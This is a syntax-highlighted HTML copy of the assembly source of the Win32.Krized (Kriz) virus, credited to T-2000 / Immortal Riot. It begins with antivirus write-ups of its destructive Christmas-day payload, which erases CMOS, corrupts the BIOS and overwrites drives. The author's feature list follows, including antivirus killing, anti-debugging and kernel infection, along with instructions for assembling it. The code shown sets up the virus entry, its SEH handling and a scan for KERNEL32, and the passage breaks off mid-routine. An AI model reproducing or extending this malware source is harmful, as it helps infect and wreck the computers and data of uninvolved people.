</span><span class="sc1">; erases the CMOS memory, overwrites data in all files on all available</span><span class="sc0">
</span><span class="sc1">; drives, and then destroys the Flash BIOS by using the same routine that was</span><span class="sc0">
</span><span class="sc1">; found in the Win95.CIH virus (aka Chernobyl virus).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Win32.Kriz.3740 is a memory resident, polymorphic, Windows virus. It</span><span class="sc0">
</span><span class="sc1">; replicates under Windows 95, Windows 98, and Windows NT systems and infects</span><span class="sc0">
</span><span class="sc1">; Windows programs with EXE (executable) and SCR (screen savers) filename</span><span class="sc0">
</span><span class="sc1">; extensions, as well as Windows KERNEL32.DLL system library that allows the</span><span class="sc0">
</span><span class="sc1">; virus to stay memory resident during the entire Windows session.</span><span class="sc0">


</span><span class="sc1">; SOPHOS</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  VIRUS NAME: W32/Kriz.</span><span class="sc0">
</span><span class="sc1">;     ALIASES: Kriz, W32.Kriz.3740, Win32.Kriz.</span><span class="sc0">
</span><span class="sc1">;        TYPE: PE executable virus.</span><span class="sc0">
</span><span class="sc1">;    RESIDENT: Yes.</span><span class="sc0">
</span><span class="sc1">;     STEALTH: No.</span><span class="sc0">
</span><span class="sc1">; DESCRIPTION: This virus, which works under Windows 95/98 and Windows NT,</span><span class="sc0">
</span><span class="sc1">;              infects PE (Portable Executable) files with .EXE or .SCR</span><span class="sc0">
</span><span class="sc1">;              extensions. It also infects KERNEL32.DLL.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;              W32/Kriz has a particularly destructive payload. On December</span><span class="sc0">
</span><span class="sc1">;              25th it will erase the CMOS setup, attempt to corrupt the</span><span class="sc0">
</span><span class="sc1">;              system BIOS (in a similar way to W95/CIH-10xx) and attempt to</span><span class="sc0">
</span><span class="sc1">;              overwrite all files on all local hard disks and network drives</span><span class="sc0">
</span><span class="sc1">;              with garbage.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;              If the system BIOS corruption is successful you will no longer</span><span class="sc0">
</span><span class="sc1">;              be able to use your computer, and the BIOS chip may need to be</span><span class="sc0">
</span><span class="sc1">;              replaced.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;              There are two known variants of this virus, but only one of</span><span class="sc0">
</span><span class="sc1">;              these is known to be in the wild.</span><span class="sc0">


</span><span class="sc1">; Note, all bugs mentioned in the articles above have been fixed.</span><span class="sc0">

</span><span class="sc1">; Source:</span><span class="sc0">


</span><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        NAME: Win32.Krized v1.666</span><span class="sc0">
</span><span class="sc1">;        TYPE: Parasitic resident polymorphic K32/PE-infector.</span><span class="sc0">
</span><span class="sc1">;          OS: Windoze 95/98/NT/2000.</span><span class="sc0">
</span><span class="sc1">;         CPU: 386+</span><span class="sc0">
</span><span class="sc1">;        SIZE: Around 4k.</span><span class="sc0">
</span><span class="sc1">;      AUTHOR: T-2000 / Immortal Riot.</span><span class="sc0">
</span><span class="sc1">;      E-MAIL: T2000_@hotmail.com</span><span class="sc0">
</span><span class="sc1">;        DATE: April 1999 - August 1999.</span><span class="sc0">
</span><span class="sc1">;     PAYLOAD: Judgement Day on X-mas.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    FEATURES:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       - Completely Win32-compatible.</span><span class="sc0">
</span><span class="sc1">;       - Achieves global Win32-residency by kernel-infection.</span><span class="sc0">
</span><span class="sc1">;       - Polymorphic encrypted in files (PE/K32).</span><span class="sc0">
</span><span class="sc1">;       - Traps possible errors with SEH's.</span><span class="sc0">
</span><span class="sc1">;       - Anti-debugger/disassembler/emulator code.</span><span class="sc0">
</span><span class="sc1">;       - Calculates correct image-checksum when needed.</span><span class="sc0">
</span><span class="sc1">;       - Kills various AV-programs.</span><span class="sc0">
</span><span class="sc1">;       - Win9x-payload: ring-0 CMOS &amp; BIOS-trashing.</span><span class="sc0">
</span><span class="sc1">;       - Win32-payload: local &amp; network drive-trashing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Succesfully tested under Windoze 95, 98, NT 4.0, and 2000 beta 3.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Creds go to Johnny Panic for the CRC-routines, to CIH for the</span><span class="sc0">
</span><span class="sc1">; BIOS-nuker, and to Rude Boy for the image-checksum algorithm.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Assemble with: TASM32 KRIZED.ASM /ml /m</span><span class="sc0">
</span><span class="sc1">;                TLINK32 KRIZED.OBJ IMPORT32.LIB</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Greets to Metal Militia, The Unforgiven, Johnny Panic, Bad Spirit,</span><span class="sc0">
</span><span class="sc1">; Godlike, Retch, The Lich, LovinGod, Vendigo, Morphine, and Lord Julus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">


        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc2">.386p</span><span class="sc0">
        </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">FLAT</span><span class="sc0">

    </span><span class="sc1">; Stuff our code in the data-section, which is already</span><span class="sc0">
        </span><span class="sc1">; readable/writeable, so we don't have to manually set</span><span class="sc0">
        </span><span class="sc1">; the write-bit to the code-section anymore.</span><span class="sc0">

        </span><span class="sc9">.DATA</span><span class="sc0">

</span><span class="sc1">; Some exports, only used by the carrier.</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0">           </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0">           </span><span class="sc5">GetFileAttributesA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0">           </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

        </span><span class="sc1">; *** Various equates we use. ***</span><span class="sc0">

</span><span class="sc5">GENERIC_READ</span><span class="sc0">                    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">40000000h</span><span class="sc0">
</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000003h</span><span class="sc0">
</span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000080h</span><span class="sc0">
</span><span class="sc5">PAGE_READONLY</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">PAGE_READWRITE</span><span class="sc0">                  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000004h</span><span class="sc0">
</span><span class="sc5">FILE_MAP_READ</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000004h</span><span class="sc0">
</span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">                  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000002h</span><span class="sc0">

</span><span class="sc5">EWX_REBOOT</span><span class="sc0">                      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">EWX_FORCE</span><span class="sc0">                       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000004h</span><span class="sc0">

</span><span class="sc5">MOVEFILE_REPLACE_EXISTING</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">MOVEFILE_DELAY_UNTIL_REBOOT</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000004h</span><span class="sc0">

</span><span class="sc5">ERROR_ACCESS_DENIED</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000005h</span><span class="sc0">

</span><span class="sc5">RESOURCE_CONNECTED</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">RESOURCETYPE_DISK</span><span class="sc0">               </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0">

</span><span class="sc5">DRIVE_REMOVABLE</span><span class="sc0">                 </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">DRIVE_CDROM</span><span class="sc0">                     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000005h</span><span class="sc0">
</span><span class="sc5">DRIVE_RAMDISK</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000006h</span><span class="sc0">

</span><span class="sc5">Virus_Size</span><span class="sc0">                      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Virus_End</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Poly_Size</span><span class="sc0">                       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">200</span><span class="sc0">     </span><span class="sc1">; Maximum size of generated</span><span class="sc0">
                        </span><span class="sc1">; polymorphic decryptors.</span><span class="sc0">

</span><span class="sc5">Work_API_Count</span><span class="sc0">                  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">End_Work_API_CRC</span><span class="sc4">-</span><span class="sc5">Work_API_CRC</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">Hook_API_Count</span><span class="sc0">                  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Work_API_CRC</span><span class="sc4">-</span><span class="sc5">Hook_API_CRC</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">Kill_CRC_Count</span><span class="sc0">                  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">End_Kill_Table</span><span class="sc4">-</span><span class="sc5">Kill_Table</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">; Equates used to index the API address table.</span><span class="sc0">

</span><span class="sc5">ixCopyFileA</span><span class="sc0">                     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00</span><span class="sc0">
</span><span class="sc5">ixCreateFileA</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">01</span><span class="sc0">
</span><span class="sc5">ixCreateProcessA</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">02</span><span class="sc0">
</span><span class="sc5">ixDeleteFileA</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">03</span><span class="sc0">
</span><span class="sc5">ixGetFileAttributesA</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">04</span><span class="sc0">
</span><span class="sc5">ixMoveFileA</span><span class="sc0">                     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">05</span><span class="sc0">
</span><span class="sc5">ixMoveFileExA</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">06</span><span class="sc0">
</span><span class="sc5">ixSetFileAttributesA</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">07</span><span class="sc0">

</span><span class="sc5">ixCopyFileW</span><span class="sc0">                     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">08</span><span class="sc0">
</span><span class="sc5">ixCreateFileW</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">09</span><span class="sc0">
</span><span class="sc5">ixCreateProcessW</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">ixDeleteFileW</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">ixGetFileAttributesW</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">ixMoveFileW</span><span class="sc0">                     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">ixMoveFileExW</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">ixSetFileAttributesW</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">15</span><span class="sc0">

</span><span class="sc5">ixCloseHandle</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">ixCreateFileMappingA</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">17</span><span class="sc0">
</span><span class="sc5">ixFindClose</span><span class="sc0">                     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">18</span><span class="sc0">
</span><span class="sc5">ixFindFirstFileA</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">19</span><span class="sc0">
</span><span class="sc5">ixFindNextFileA</span><span class="sc0">                 </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">ixGetCurrentDirectoryA</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
</span><span class="sc5">ixGetDriveTypeA</span><span class="sc0">                 </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">22</span><span class="sc0">
</span><span class="sc5">ixGetFileSize</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">23</span><span class="sc0">
</span><span class="sc5">ixGetFileTime</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">24</span><span class="sc0">
</span><span class="sc5">ixGetLastError</span><span class="sc0">                  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">25</span><span class="sc0">
</span><span class="sc5">ixGetLocalTime</span><span class="sc0">                  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">26</span><span class="sc0">
</span><span class="sc5">ixGetLogicalDriveStringsA</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">27</span><span class="sc0">
</span><span class="sc5">ixGetProcAddress</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">28</span><span class="sc0">
</span><span class="sc5">ixGetSystemDirectoryA</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">29</span><span class="sc0">
</span><span class="sc5">ixGetTickCount</span><span class="sc0">                  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">30</span><span class="sc0">
</span><span class="sc5">ixGetWindowsDirectoryA</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">31</span><span class="sc0">
</span><span class="sc5">ixGlobalAlloc</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">32</span><span class="sc0">
</span><span class="sc5">ixGlobalFree</span><span class="sc0">                    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">33</span><span class="sc0">
</span><span class="sc5">ixLoadLibraryA</span><span class="sc0">                  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">34</span><span class="sc0">
</span><span class="sc5">ixMapViewOfFile</span><span class="sc0">                 </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">35</span><span class="sc0">
</span><span class="sc5">ixSetCurrentDirectoryA</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">36</span><span class="sc0">
</span><span class="sc5">ixSetFileTime</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">37</span><span class="sc0">
</span><span class="sc5">ixUnmapViewOfFile</span><span class="sc0">               </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">38</span><span class="sc0">
</span><span class="sc5">ixWriteFile</span><span class="sc0">                     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">39</span><span class="sc0">
</span><span class="sc5">ixWritePrivateProfileStringA</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">40</span><span class="sc0">



</span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">String</span><span class="sc0">

    </span><span class="sc5">CRC_Reg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">

    </span><span class="sc9">IRPC</span><span class="sc0"> </span><span class="sc5">_x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">String</span><span class="sc4">&gt;</span><span class="sc0">
      </span><span class="sc5">Ctrl_Byte</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'&amp;_x&amp;'</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">CRC_Reg</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">))</span><span class="sc0">
      </span><span class="sc5">CRC_Reg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">CRC_Reg</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">
      </span><span class="sc9">REPT</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc5">Ctrl_Byte</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Ctrl_Byte</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0EDB88320h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Ctrl_Byte</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">))</span><span class="sc0">
      </span><span class="sc9">ENDM</span><span class="sc0">
      </span><span class="sc5">CRC_Reg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">CRC_Reg</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc5">Ctrl_Byte</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">

    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">CRC_Reg</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">


        </span><span class="sc1">; === VIRUSCODE STARTS HERE ===</span><span class="sc0">
</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Delta</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                </span><span class="sc1">; Zero EDX.</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">31337</span><span class="sc0">                 </span><span class="sc1">; Simple anti-heuristic.</span><span class="sc0">

        </span><span class="sc1">; Zero the key of the decryptor, so the</span><span class="sc0">
        </span><span class="sc1">; code won't be fucked-up the next time</span><span class="sc0">
        </span><span class="sc1">; DLLMain get's called.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Stupid_Dummy</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">
</span><span class="sc5">Patch_Decrypt</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">              </span><span class="sc1">; Calculate our base-address.</span><span class="sc0">
</span><span class="sc5">Virus_RVA</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc1">; Calculate VA of our host.</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">1000h</span><span class="sc4">+(</span><span class="sc5">Carrier</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">))</span><span class="sc0">
</span><span class="sc5">Host_EIP</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+(</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">        </span><span class="sc1">; Patch return-address with</span><span class="sc0">
                        </span><span class="sc1">; original entrypoint.</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">CALL_Setup_SEH</span><span class="sc0">          </span><span class="sc1">; Abort further processing?</span><span class="sc0">
</span><span class="sc5">Init_Mode</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Return_To_Host</span><span class="sc0">

</span><span class="sc5">CALL_Setup_SEH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Setup_Load_SEH</span><span class="sc0">          </span><span class="sc1">; Bump SEH-address on stack.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">        </span><span class="sc1">; Restore original ESP.</span><span class="sc0">

</span><span class="sc5">JMP_R_Init_SEH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Rest_Init_SEH</span><span class="sc0">           </span><span class="sc1">; And end further processing.</span><span class="sc0">

</span><span class="sc5">Author</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'T-2000 / Immortal Riot'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Setup_Load_SEH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Bump original SEH on stack.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">           </span><span class="sc1">; Stuff our own SEH-address.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+(</span><span class="sc2">12</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">       </span><span class="sc1">; Get pointer to last SEH.</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Align on a 64k boundary.</span><span class="sc0">

</span><span class="sc5">Find_K32_Base</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">            </span><span class="sc1">; Below application-memory?</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">JMP_R_Init_SEH</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EAX.MZ_Mark</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">     </span><span class="sc1">; Found the kernel?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Loop_Find_K32</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EAX.MZ_Reloc_Table</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">  </span><span class="sc1">; K32 has a PE-header.</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Loop_Find_K32</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; RVA of PE-header.</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Plus base, (make it a VA).</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.PE_Mark</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">     </span><span class="sc1">; Verify PE-header, just in</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Loop_Find_K32</span><span class="sc0">           </span><span class="sc1">; case.</span><span class="sc0">

        </span><span class="sc1">; Verify it's a DLL we've found.</span><span class="sc0">

        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.PE_Flags</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00100000b</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Found_K32_Base</span><span class="sc0">

</span><span class="sc5">Loop_Find_K32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">65536</span><span class="sc0">              </span><span class="sc1">; Scan downwards, stuff</span><span class="sc0">
                        </span><span class="sc1">; always gets loaded at</span><span class="sc0">
                        </span><span class="sc1">; a 64k boundary.</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Find_K32_Base</span><span class="sc0">           </span><span class="sc1">; Just repeat the loop.</span><span class="sc0">

